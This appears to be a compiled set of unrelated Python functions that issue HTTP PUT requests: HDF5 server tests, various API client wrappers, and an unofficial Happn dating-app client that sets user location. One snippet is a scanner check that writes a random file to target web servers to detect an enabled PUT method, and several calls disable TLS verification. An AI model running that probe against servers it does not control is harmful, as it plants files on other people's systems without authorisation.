        return  # already have domain
    if rsp.status_code != 404:
        # something other than "not found"
        raise ValueError(f"Unexpected get domain error: {rsp.status_code}")
    parent_domain = getParentDomain(domain)
    if parent_domain is None:
        raise ValueError(f"Invalid parent domain: {domain}")
    # create parent domain if needed
    setupDomain(parent_domain, folder=True)

    headers = getRequestHeaders(domain=domain)
    body=None
    if folder:
        body = {"folder": True}
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
    else:
        rsp = requests.put(req, headers=headers)
    if rsp.status_code != 201:
        raise ValueError(f"Unexpected put domain error: {rsp.status_code}") 
**************************************
def testPutInvalid(self):
        print("testPutInvalid", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_id = rspJson["root"]

        # try creating an attribute with an invalid type
        attr_name = "attr1"
        attr_payload = {'type': 'H5T_FOOBAR', 'value': 42}
        req = self.endpoint + "/groups/" + root_id + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(attr_payload), headers=headers)
        self.assertEqual(rsp.status_code, 400)  # invalid request 
**************************************
def setupDomain(domain):
    endpoint = config.get("hsds_endpoint")
    print("setupdomain: ", domain)
    headers = getRequestHeaders(domain=domain)
    req = endpoint + "/"
    rsp = requests.get(req, headers=headers)
    if rsp.status_code == 200:
        return  # already have domain
    if rsp.status_code != 404:
        # something other than "not found"
        raise ValueError("Unexpected get domain error: {}".format(rsp.status_code))

    parent_domain = getParentDomain(domain)
    if parent_domain is None:
        raise ValueError("Invalid parent domain: {}".format(domain))
    # create parent domain if needed
    setupDomain(parent_domain)  
     
    headers = getRequestHeaders(domain=domain)
    rsp = requests.put(req, headers=headers)
    if rsp.status_code != 201:
        raise ValueError("Unexpected put domain error: {}".format(rsp.status_code)) 
**************************************
def api_call_put(self, uri, data='{}'):
        headers = {'X-Auth-Email': self.EMAIL, 'X-Auth-Key': self.TOKEN, 'Content-Type': 'application/json'}
        try:
            r = requests.put(cf_api_url + uri, data=json.dumps(data), headers=headers)
        except (requests.ConnectionError,
                requests.RequestException,
                requests.HTTPError,
                requests.Timeout,
                requests.TooManyRedirects) as e:
            raise self.CONNError(str(e))
        try:
            api_result = json.loads(r.text)
        except ValueError:
            raise self.APIError('JSON parse failed.')
        if api_result['result'] == 'error':
            raise self.APIError(api_result['msg'])
        elif api_result['errors']:
            raise self.APIError(str(api_result['errors']))
        return api_result

    ################################################################
    #  Zone (https://api.cloudflare.com/#zone)                     #
    ################################################################

    #  Get all zones 
**************************************
def set_settings(self, settings):
        h=headers
        h.update({
          'Authorization'   : 'OAuth="'+ self.oauth + '"',
          'Content-Length'  :  '1089', #@TODO figure out length calculation
          'Content-Type'    : 'application/json'})

        # Happn preferences
        url = 'https://api.happn.fr/api/users/' + self.id
        try:
            r = requests.put(url, headers=h, data = json.dumps(settings))
        except Exception as e:
            raise HTTP_MethodError('Error Setting Settings: {}'.format(e))

        if r.status_code == 200: #200 = 'OK'
            logging.debug('Updated Settings')
        else:
            # Unable to fetch distance
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def update_activity(self):
        """ Updates User activity """

        # Create and send HTTP PUT to Happn server
        h = headers
        h.update({
            'Authorization' : 'OAuth="'+ self.oauth + '"',
            'Content-Type'  : 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': '20'
        })
        payload = {
            'update_activity' :  'true'
        }
        url = 'https://api.happn.fr/api/users/'+self.id
        try:
            r = requests.put(url, headers=h, data = payload)
        except Exception as e:
            raise HTTP_MethodError('Error Connecting to Happn Server: {}'.format(e))

        if r.status_code == 200: #200 = 'OK'
            logging.debug('Updated User activity')
        else:
            # Unable to fetch distance
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def _try_upload(url, chunk, heads):
    response = None
    for n in range(0, 11):
        if n > 0:
            print("Upload re-try #{}...".format(n))
        try:
            print("Uploading...".format(n))
            response = requests.put(url, data=chunk, headers=heads)
            print("Done.")
            if response.status_code not in [requests.codes.ok, requests.codes.accepted, requests.codes.created]:
                print("Response status: {} ({}).".format(response.status_code, response.reason))
                raise IOError
            return response
        except IOError as e:
            print("Exception: " + str(e))
            time.sleep(2 ** n)
        finally:
            if response is not None:
                response.close()
    raise IOError("Filed to upload file") 
**************************************
def put(self, *args, **kwargs):
        kwargs['method'] = 'put'
        return self.do(*args, **kwargs) 
**************************************
def api_submit(request, user=None, password=None):

    # Fetch the list of deploys for the application
    # This becomes the api call
    api_url = (api_protocol
               + '://'
               + api_host
               + request)

    if user:
        logging.info('Submitting data to API: %s' % api_url)
        r = requests.put(api_url, verify=verify_ssl, auth=HTTPBasicAuth(user, password))
    else:
        logging.info('Requesting data from API: %s' % api_url)
        r = requests.get(api_url, verify=verify_ssl)

    if r.status_code == requests.codes.ok:

        logging.debug('Response data: %s' % r.json())
        return r.json()

    elif r.status_code == requests.codes.conflict:

        logging.info('Artifact location/revision combination '
                     'is not unique. Nothing to do.')

        logging.info('twoni-plete')
        print ""
        sys.exit(0)

    else:

        logging.error('There was an error querying the API: '
                      'http_status_code=%s,reason=%s,request=%s'
                      % (r.status_code, r.reason, api_url))
        logging.info('twoni-plete')
        print ""
        sys.exit(2) 
**************************************
def change_password(password, token):
    logger.info('Attempting to change password through the party service')

    data = {'new_password': password}
    url = f"{app.config['PARTY_URL']}/party-api/v1/respondents/change_password/{token}"
    response = requests.put(url, auth=app.config['PARTY_AUTH'], json=data)

    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError:
        logger.error('Failed to send change password request to party service', token=token)
        raise ApiError(logger, response)

    logger.info('Successfully changed password through the party service') 
**************************************
def verify_email(token):
    logger.info('Attempting to verify email address', token=token)

    url = f"{app.config['PARTY_URL']}/party-api/v1/emailverification/{token}"
    response = requests.put(url, auth=app.config['PARTY_AUTH'])

    try:
        response.raise_for_status()
    except requests.exceptions.HTTPError:
        logger.error('Failed to verify email', token=token)
        raise ApiError(logger, response)

    logger.info('Successfully verified email address', token=token) 
**************************************
def set(self, payload):
        return requests.put(self.current_url, json=payload) 
**************************************
def _put_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        return requests.put(request_url, json=requests_data, headers=request_header) 
**************************************
def __on_or_off(self, operation):
		url = 'http://'+self.IP+'/api/'+self.username+'/lights/'+self.ID+'/state'
		if operation == 'on':
			payload = '{"on": true}'
		else:
			payload = '{"on": false}'
		r = requests.put(url, data=payload)
		if r.status_code == 200:
			HueBridge.log.success(self.name + ' ' + operation)
		else:
			HueBridge.log.err(self.name + ' ' + operation)
		return r.json() 
**************************************
def __init__(self, config):
        if not have_requests:
            raise ImportError('requests module required for RequestsTransport')
        TransportBase.__init__(self, config, self.__module__)
        self.REQ_MAP = {
            'GET': requests.get,
            'POST': requests.post,
            'DELETE': requests.delete,
            'PUT': requests.put
        }
        self._timeout = self._config.get('timeout', None)
        if isinstance(self._timeout, list) and len(self._timeout) == 2:
            self._timeout = tuple(self._timeout) 
**************************************
def update(self, api_obj, data, obj_id=0, url_params=''):
        if not data:
            raise TypeError("Missing object data.")
        if url_params:
            url_params = '?' + url_params.lstrip("?")
        if not obj_id:
            obj_id = data['id']
        url = self.server + '/' + api_obj + '/' + str(obj_id) + url_params
        r = requests.put(url, data=json.dumps(data), headers=self.tokenHeaderJson, verify=self.sslVerify)
        return self.__check_result(r)


    # Delete object using HTTP DELETE request. 
**************************************
def rest_api_put(self, rest_url, body, api_version):
        """
        PUT request to the REST API - Not tested
        :return: JSON string of the PUT response
        """
        response = requests.put(
            "{org_instance}/services/data/v{api_version}/{rest_url}".format(
                org_instance=self.instance, api_version=api_version, rest_url=rest_url
            ),
            data=body,
            headers=self.sf_headers
        )

        return response 
**************************************
def _put(self, endpoint, params=None, data=None):
        response = requests.put(self.BASE_URL + endpoint, params=params, json=data, auth=(self.user, self.password))
        return self._parse(response) 
**************************************
def put(url):
    url = url.strip('/')
    text = random.randint(100000000, 200000000)
    payload = '/{}.txt'.format(text)
    url = url + payload
    data = {'{}'.format(text): '{}'.format(text)}
    r = requests.put(url, data=data, allow_redirects=False, verify=False, headers=get_ua())
    if r.status_code == 201:
        return 'HTTP METHOD PUT url: {}'.format(url) 
**************************************
def check(url, ip, ports, apps):
    result = ''
    try:
        probe = get_list(ip, ports)
        for url in probe:
            result = put(url)
    except Exception as e:
        pass
    if result:
        return result 
**************************************
def clean_consul(port, token=''):
    # remove all data from the instance, to have a clean start
    base_uri = 'http://127.0.0.1:%s/v1/' % port
    params = {'recurse': 1}
    if token:
        params['token'] = token
    requests.delete(base_uri + 'kv/', params=params)
    services = requests.get(base_uri + 'agent/services',
                            params=params).json().keys()
    for s in services:
        requests.put(base_uri + 'agent/service/deregister/%s' % s)

    if token:
        acl_tokens = requests.get(base_uri + 'acl/list', params=params).json()
        for t in acl_tokens:
            if t['ID'] != token:
                requests.put(base_uri + 'acl/destroy/%s' % t['ID'],
                             params=params)

        acl_policys = requests.get(base_uri + 'acl/policies',
                                   params=params).json()
        for pls in acl_policys:
            if pls['ID'] != token:
                requests.delete(base_uri + 'acl/policy/%s' % pls['ID'],
                                params=params)

        acl_roles = requests.get(base_uri + 'acl/roles',
                                 params=params).json()
        for role in acl_roles:
            if role['ID'] != token:
                requests.delete(base_uri + 'acl/role/%s' % role['ID'],
                                params=params) 
**************************************
def handle(event, context):
    response = {
        "Status": "SUCCESS",
        "StackId": event["StackId"],
        "RequestId": event["RequestId"],
        "LogicalResourceId": event["LogicalResourceId"]
    }

    try:
        converted = cogito.to_json(
            event["ResourceProperties"]["Policy"],
            event["ResourceProperties"].get("Substitutions", {})
        )

        response["PhysicalResourceId"] = hashlib.md5(converted.encode("utf-8")).hexdigest()
        response["Data"] = {}
        response["Data"]["PolicyDocument"] = json.dumps({
            "Version": "2012-10-17",
            "Statement": json.loads(converted)
        })
    except cogito.CogitoError as exception:
        response["Status"] = "FAILED"
        response["Resource"] = exception.message

    requests.put(event["ResponseURL"], json.dumps(response))
    return response 
**************************************
def _put(self, request, data, headers=None):
        url = '{0}{1}'.format(self._url(), request)
        headers = self.headers if headers is None else headers
        response = requests.put(url, data=json.dumps(data), headers=headers, verify=self.verify_cert,
                                timeout=self.timeout)
        return self._validate(response) 
**************************************
def jsonput(url, data={}, *arg):
    """
    自动将 PUT 请求转换为 JSON
    """
    if url.__class__.__name__ == 'function':
        url = url()
    try:
        return json_moudle.loads(requests.put(url, *arg, data=data, headers=Session.headers,
                                              verify=verify, timeout=3).text)
    except json_moudle.decoder.JSONDecodeError as e:
        log(f'JSON 解析错误,请检查知乎 API 的 URL 是否变化,当前 URL 为:{url}') 
**************************************
def testCompound(self):
        # test Dataset with compound type
        domain = self.base_domain + "/testCompound.h5"
        helper.setupDomain(domain)
        print("testCompound", domain)
        headers = helper.getRequestHeaders(domain=domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        fields = ({'name': 'temp', 'type': 'H5T_STD_I32LE'},
                    {'name': 'pressure', 'type': 'H5T_IEEE_F32LE'})
        datatype = {'class': 'H5T_COMPOUND', 'fields': fields }
        payload = {'type': datatype, 'shape': 10}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link the new dataset
        name = "dset"
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201) 
**************************************
def testEmptyShapeAttr(self):
        print("testEmptyShapeAttr", self.base_domain)
        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        attr_name = "attr_empty_shape"
        attr_payload = {'type': 'H5T_STD_I32LE', 'shape': [], 'value': 42}
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, headers=headers, data=json.dumps(attr_payload))
        self.assertEqual(rsp.status_code, 201)  # created

        # read back the attribute
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)  # OK
        rspJson = json.loads(rsp.text)
        self.assertTrue("name" in rspJson)
        self.assertEqual(rspJson["name"], "attr_empty_shape")
        self.assertTrue("type" in rspJson)
        attr_type = rspJson["type"]
        self.assertEqual(attr_type["base"], "H5T_STD_I32LE")
        self.assertTrue("hrefs" in rspJson)
        self.assertEqual(len(rspJson["hrefs"]), 3)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], 42)
        self.assertTrue("shape" in rspJson)
        attr_shape = rspJson["shape"]
        self.assertTrue("class" in attr_shape)
        self.assertEqual(attr_shape["class"], "H5S_SCALAR") 
**************************************
def testPutVLenString(self):
        # Test PUT value for 1d attribute with variable length string types
        print("testPutVLenString", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        words = ["Parting", "is such", "sweet", "sorrow."]
        fixed_str_type = {"charSet": "H5T_CSET_ASCII",
                "class": "H5T_STRING",
                "length": "H5T_VARIABLE",
                "strPad": "H5T_STR_NULLTERM" }
        data = { "type": fixed_str_type, "shape": 4,
            "value": words}
        attr_name = "str_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertEqual(rspJson["value"], words)
        self.assertTrue("type" in rspJson)
        type_json = rspJson["type"]
        self.assertTrue("class" in type_json)
        self.assertEqual(type_json["class"], "H5T_STRING")
        self.assertTrue("length" in type_json)
        self.assertEqual(type_json["length"], "H5T_VARIABLE") 
**************************************
def testGetAttributeJsonValue(self):
        # Test GET Attribute value with JSON response
        print("testGetAttributeJsonValue", self.base_domain)

        headers = helper.getRequestHeaders(domain=self.base_domain)
        req = self.endpoint + '/'

        # Get root uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        root_uuid = rspJson["root"]
        helper.validateId(root_uuid)

        # create attr
        value = [2,3,5,7,11,13]
        data = { "type": 'H5T_STD_I32LE', "shape": 6, "value": value}
        attr_name = "int_arr_attr"
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name
        rsp = requests.put(req, data=json.dumps(data), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # read attr
        req = self.endpoint + "/groups/" + root_uuid + "/attributes/" + attr_name + "/value"
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("hrefs" in rspJson)
        self.assertTrue("value" in rspJson)
        self.assertFalse("type" in rspJson)
        self.assertFalse("shape" in rspJson)
        self.assertEqual(rspJson["value"], value) 
**************************************
def testCreateFolder(self):
        domain = self.base_domain + "/newfolder"
        print("testCreateFolder", domain)
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'
        body = {"folder": True}
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 201)
        rspJson = json.loads(rsp.text)
        for k in ("owner", "acls", "created", "lastModified"):
             self.assertTrue(k in rspJson)
        self.assertFalse("root" in rspJson)  # no root -> folder

        # verify that putting the same domain again fails with a 409 error
        rsp = requests.put(req, data=json.dumps(body), headers=headers)
        self.assertEqual(rsp.status_code, 409)

        # do a get on the new folder
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)

        self.assertTrue("owner" in rspJson)
        self.assertTrue("class" in rspJson)
        self.assertEqual(rspJson["class"], "folder")

        # try doing a un-authenticated request
        if config.get("test_noauth") and config.get("default_public"):
            headers = helper.getRequestHeaders()
            req = helper.getEndpoint() + "/?host=" + domain
            # do a get on the folder with a query arg for host
            rsp = requests.get(req)
            self.assertEqual(rsp.status_code, 200)
            rspJson = json.loads(rsp.text)
            for k in ("class", "owner"):
                self.assertTrue(k in rspJson)
            self.assertFalse("root" in rspJson) 
**************************************
def testInvalidChildDomain(self):
        domain = self.base_domain + "/notafolder/newdomain.h5"
        # should fail assuming "notafolder" doesn't exist
        headers = helper.getRequestHeaders(domain=domain)
        req = helper.getEndpoint() + '/'

        rsp = requests.put(req, headers=headers)
        self.assertEqual(rsp.status_code, 404) 
**************************************
def add_users_to_siteAccess(token, access_mode, allowed_principal_ids):
    headers = {'Authorization': 'Bearer ' + token}
    r = requests.put(CATTLE_AUTH_PROVIDER_URL, json={
        'allowedPrincipalIds': allowed_principal_ids,
        'accessMode': access_mode,
        'responseType': 'json',
    }, verify=False, headers=headers)
    print(r.json()) 
**************************************
def set_position(self, latitude, longitude):
        """ Set the position of the user using Happn's API
            :param latitude Latitude to position the User
            :param longitude Longitude to position the User
        """

        # Create & Send the HTTP Post to Happn server
        h=headers
        h.update({
            'Authorization' : 'OAuth="'+ self.oauth + '"',
            'Content-Length': '342', #@TODO figure out length calculation
            'Content-Type'  : 'application/json'
            })

        url = 'https://api.happn.fr/api/users/' + self.id + '/devices/'+config('DEVICE_ID')
        payload = {
            "alt"       : 20 + random.uniform(-10,10),
            "latitude"  : round(latitude,7),
            "longitude" : round(longitude,7),
        }
        r = requests.put(url,headers=h,data=json.dumps(payload))

        # Check status of Position Update
        if r.status_code == 200:    #OK HTTP status
            self.lat = latitude
            self.lon = longitude
            logging.debug('Set User position at %f, %f', self.lat, self.lon)
        else:
            # Status failed, get the current location according to the server
            #@TODO IMPLEMENT ^
            self.lat = latitude
            self.lon = longitude

            logging.warning("""Server denied request for position change: %s,
                                will revert to server known location""", httpErrors[r.status_code])

            # If unable to change location raise an exception
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def set_matching_age_min(self, age):
        """ Set matching min. age
            :mininum age to like
        """

        # Create and send HTTP PUT to Happn server
        h = headers
        h.update({
            'Authorization' : 'OAuth="'+ self.oauth + '"',
            'Content-Type'  : 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': '20'
        })
        payload = {
            'matching_age_min' : age
        }
        url = 'https://api.happn.fr/api/users/' + self.id
        try:
            r = requests.put(url, headers=h, data = payload,verify=False)
        except Exception as e:
            raise HTTP_MethodError('Error Connecting to Happn Server: {}'.format(e))

        if r.status_code == 200: #200 = 'OK'
            logging.debug('Set minimum accept age to '+str(age))
        else:
            # Unable to fetch distance
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def set_matching_age_max(self, age):
        """ Set matching max. age
            :maximum age to like
        """

        # Create and send HTTP PUT to Happn server
        h = headers
        h.update({
            'Authorization' : 'OAuth="'+ self.oauth + '"',
            'Content-Type'  : 'application/x-www-form-urlencoded; charset=UTF-8',
            'Content-Length': '20'
        })
        payload = {
            'matching_age_max' : age
        }
        url = 'https://api.happn.fr/api/users/' + self.id
        try:
            r = requests.put(url, headers=h, data = payload,verify=False)
        except Exception as e:
            raise HTTP_MethodError('Error Connecting to Happn Server: {}'.format(e))

        if r.status_code == 200: #200 = 'OK'
            logging.debug('Set maximum accept age to '+str(age))
        else:
            # Unable to fetch distance
            raise HTTP_MethodError(httpErrors[r.status_code]) 
**************************************
def updateticket(ticket,priority,status):
  """api call for update a tiket in freshdesk"""
  headers = {
    'Content-Type': 'application/json',
  }
  data = { "priority": priority, "status": status }
  json_data=json.dumps(data);
  url=ticket_url+'/'+str(ticket)

  response = requests.put(url, headers=headers, data=json_data, auth=(apikey, 'X'))
  return response 
**************************************
def state_save(self):
        try:
            data = '{"put": {"state":' + str(json.dumps(self.state)) + '}}'
            response = requests.put(self.config['database']['url'], headers=self.config['database']['headers'], data=data)
            self.log_add_text('helper', str(response.text))
            self.log_add_text('helper', 'saved state ' + str(self.state))
            return
        except Exception as e:
            self.log_add_text('helper', str(e)) 
**************************************
def upload_file(body, fileName, contentType, contentLength):

    # 1. GET FILE STORAGE URI
    fileUploadPartsResponse = requests.post(fileUploadRequestURI, 
        headers={
            'Authorization': iotHubSasToken,
            'Content-Type': 'application/json'
        },
        data = '{ "blobName": "%s"}' % (fileName)
    )

    print(fileUploadRequestURI)
    print(fileUploadPartsResponse.status_code)
    print(fileUploadPartsResponse.text)

    if fileUploadPartsResponse.status_code == 200:
 
        fileUploadParts = fileUploadPartsResponse.json()
        fileUploadURI = fileUploadURITemplate % (fileUploadParts["hostName"], fileUploadParts["containerName"], fileUploadParts["blobName"], fileUploadParts["sasToken"])
        
        # 2. UPLOAD FILE TO BLOB STORAGE
        uploadResponse = requests.put(fileUploadURI, 
            headers={
                'Content-Type': contentType,
                'Content-Length': contentLength,
                'x-ms-blob-type': 'BlockBlob',
                
            },
            data = body
        )

        print(fileUploadURI)
        print(uploadResponse.status_code)
        print(uploadResponse.text)
        
        if uploadResponse.status_code == 201:

            # 3. GET UPLOAD FILE NOTIFICATION
            notificationResponse = requests.post(notificationURI, 
                headers={
                    'Authorization': iotHubSasToken,
                    'Content-Type': 'application/json'
                },
                data = '{"correlationId": "%s" }' % (fileUploadParts["correlationId"])
            )
    
            print(notificationURI)
            print(notificationResponse.status_code)
            print(notificationResponse.text) 
**************************************
def _request(self, method, path, query=False, data=False):
        """
        Do the request

        :param method: choose the method to use (post, put or delete)
        :type method: str

        :param path: choose the path to use
        :type path: str

        :param query: choose the query to use
        :type query: str

        :param data: the payload for the post method
        :type data: str

        :return: the response
        :rtype: str or False
        """
        requests_headers = {'Accept': 'application/json',
                            'User-Agent': 'oliver-zehentleitner/unicorn-binance-websocket-api/' +
                                          self.unicorn_binance_websocket_api_version,
                            'X-MBX-APIKEY': str(self.api_key)}
        if query is not False:
            uri = self.restful_base_uri + path + "?" + query
        else:
            uri = self.restful_base_uri + path
        try:
            if method == "post":
                request_handler = requests.post(uri, headers=requests_headers)
            elif method == "put":
                request_handler = requests.put(uri, headers=requests_headers, data=data)
            elif method == "delete":
                request_handler = requests.delete(uri, headers=requests_headers)
            else:
                request_handler = False
        except requests.exceptions.ConnectionError as error_msg:
            logging.critical("BinanceWebSocketApiRestclient->_request() - error_msg: " + str(error_msg))
            return False
        except socket.gaierror as error_msg:
            logging.critical("BinanceWebSocketApiRestclient->_request() - error_msg: " + str(error_msg))
            return False
        if request_handler.status_code == "418":
            logging.critical("BinanceWebSocketApiRestclient->_request() received status_code 418 from binance! You got"
                             "banned from the binance api! Read this: https://github.com/binance-exchange/binance-"
                             "official-api-sphinx/blob/master/rest-api.md#limits")
        elif request_handler.status_code == "429":
            logging.critical("BinanceWebSocketApiRestclient->_request() received status_code 429 from binance! Back off"
                             "or you are going to get banned! Read this: https://github.com/binance-exchange/binance-"
                             "official-api-sphinx/blob/master/rest-api.md#limits")

        try:
            respond = request_handler.json()
        except simplejson.errors.JSONDecodeError as error_msg:
            logging.critical(str(error_msg))
            return False
        self.binance_api_status['weight'] = request_handler.headers.get('X-MBX-USED-WEIGHT')
        self.binance_api_status['timestamp'] = time.time()
        self.binance_api_status['status_code'] = request_handler.status_code
        request_handler.close()
        return respond 
**************************************
def push_modification(self, modification):
        url = self.API_ROOT + "/repos/{}/{}/contents/{}".format(
            self.head_owner, self.head_repo, modification.file_path
        )

        r = requests.get(url, params={"ref": self.head_ref})
        if not r.ok:
            raise Exception("Can not access to the {}/{}'s content.".format(
                self.head_owner, self.head_repo
            ))
        encoding = r.encoding
        body = r.json()
        content = body["content"]
        content = base64.b64decode(content).decode(encoding)
        sha = body["sha"]
        fix_position = int(modification.line_no) - 1  # read file lines start with 0
        fixed = content
        with StringIO(content) as c:
            lines = c.readlines()
            words = lines[fix_position].split(" ")
            for i, w in enumerate(words):
                _w = SpellChecker.strip(w.strip())
                if _w == modification.target_word:
                    words[i] = words[i].replace(_w, modification.candidates[0])
            
            fixed = " ".join(words) + "\n"
            lines[fix_position] = fixed
            fixed = "".join(lines)
        
        if content != fixed:
            encoded = base64.b64encode(fixed.encode(encoding)).decode(encoding)
            message = "fix typo: {} to {}, line {}".format(
                modification.target_word,
                modification.candidates[0],
                modification.line_no
                )

            payload = {
                "message": message,
                "content": encoded,
                "sha": sha,
                "branch": self.head_ref
            }
            r = requests.put(url, json=payload,headers=make_auth_header(self.installation_id))

            if not r.ok:
                print(r.json())
                r.raise_for_status()
            return True
        
        return False 
**************************************
def testPostNullSpace(self):
        # test Dataset with null dataspace type
        domain = self.base_domain + "/testPostNullSpace.h5"
        helper.setupDomain(domain)

        print("testNullSpace", domain)
        headers = helper.getRequestHeaders(domain=domain)

        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # pass H5S_NULL for shape
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': 'H5S_NULL'}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)
        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset1'
        name = 'dset1'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify the dataspace is has a null dataspace
        req = self.endpoint + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        shape = rspJson['shape']
        self.assertEqual(shape['class'], 'H5S_NULL')
        # verify type
        type_json = rspJson["type"]
        self.assertEqual(type_json["class"], 'H5T_FLOAT')
        self.assertEqual(type_json['base'], 'H5T_IEEE_F32LE') 
**************************************
def testAutoChunk1dDataset(self):
        # test Dataset where chunk layout is set automatically
        domain = self.base_domain + "/testAutoChunk1dDataset.h5"
        helper.setupDomain(domain)
        print("testAutoChunk1dDataset", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K dataset
        extent = 1000 * 1000 * 1000
        dims = [extent,]
        fields = (  {'name': 'x', 'type': 'H5T_IEEE_F64LE'},
                    {'name': 'y', 'type': 'H5T_IEEE_F64LE'},
                    {'name': 'z', 'type': 'H5T_IEEE_F64LE'})
        datatype = {'class': 'H5T_COMPOUND', 'fields': fields }

        payload = {'type': datatype, 'shape': dims }
        # the following should get ignored as too small
        payload['creationProperties'] = {'layout': {'class': 'H5D_CHUNKED', 'dims': [10,] }}
        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)

        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
        req = self.endpoint + "/groups/" + root_uuid + "/links/" + name
        payload = {"id": dset_uuid}
        rsp = requests.put(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)

        # verify layout
        req = helper.getEndpoint() + "/datasets/" + dset_uuid
        rsp = requests.get(req, headers=headers)
        self.assertEqual(rsp.status_code, 200)
        rspJson = json.loads(rsp.text)
        self.assertTrue("layout" in rspJson)
        layout_json = rspJson["layout"]
        self.assertTrue("class" in layout_json)
        self.assertEqual(layout_json["class"], 'H5D_CHUNKED')
        self.assertTrue("dims" in layout_json)
        self.assertTrue("partition_count" not in layout_json)
        layout = layout_json["dims"]
        self.assertEqual(len(layout), 1)
        self.assertTrue(layout[0] < dims[0])
        chunk_size = layout[0] * 8 * 3  # three 64bit
        # chunk size should be between chunk min and max
        self.assertTrue(chunk_size >= CHUNK_MIN)
        self.assertTrue(chunk_size <= CHUNK_MAX) 
**************************************
def testAutoChunk2dDataset(self):
        # test Dataset where chunk layout is set automatically
        domain = self.base_domain + "/testAutoChunk2dDataset.h5"
        helper.setupDomain(domain)
        print("testAutoChunk2dDataset", domain)
        headers = helper.getRequestHeaders(domain=domain)
        # get domain
        req = helper.getEndpoint() + '/'
        rsp = requests.get(req, headers=headers)
        rspJson = json.loads(rsp.text)
        self.assertTrue("root" in rspJson)
        root_uuid = rspJson["root"]

        # create the dataset
        req = self.endpoint + "/datasets"
        # 50K x 80K dataset
        dims = [50000, 80000]
        payload = {'type': 'H5T_IEEE_F32LE', 'shape': dims }

        req = self.endpoint + "/datasets"
        rsp = requests.post(req, data=json.dumps(payload), headers=headers)
        self.assertEqual(rsp.status_code, 201)  # create dataset
        rspJson = json.loads(rsp.text)

        dset_uuid = rspJson['id']
        self.assertTrue(helper.validateId(dset_uuid))

        # link new dataset as 'dset'
        name = 'dset'
